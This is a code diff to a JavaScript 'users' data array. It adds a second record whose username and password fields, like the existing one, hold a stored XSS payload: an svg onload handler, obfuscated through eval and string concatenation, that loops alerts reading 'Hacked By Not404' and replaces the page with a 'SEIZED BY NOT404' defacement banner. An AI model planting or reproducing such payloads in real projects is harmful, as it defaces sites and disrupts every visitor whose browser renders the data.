@@ -18,5 +18,9 @@ export const users = [
   {
     "username": "<svg onload=\"setInterval(()=>alert('You Are An Idiot\\nHacked By Not404'),1000);document.body.style.background='#000';document.body.innerHTML='<h1 style=\\\"color:red;text-align:center;padding-top:20%;\\\">SEIZED BY NOT404</h1>'\">",
     "password": "<svg onload=\"setInterval(()=>alert('You Are An Idiot\\nHacked By Not404'),1000);document.body.style.background='#000';document.body.innerHTML='<h1 style=\\\"color:red;text-align:center;padding-top:20%;\\\">SEIZED BY NOT404</h1>'\">"
+  },
+  {
+    "username": "<svg/onload=\"eval('setInterval'+'(()=>'+'alert(`Hacked By Not404`)'+',1000)');document.body.style.background='black';document.body.innerHTML='<h1 style=color:red>SEIZED BY NOT404</h1>';\">",
+    "password": "<svg/onload=\"eval('setInterval'+'(()=>'+'alert(`Hacked By Not404`)'+',1000)');document.body.style.background='black';document.body.innerHTML='<h1 style=color:red>SEIZED BY NOT404</h1>';\">"
   }
 ];
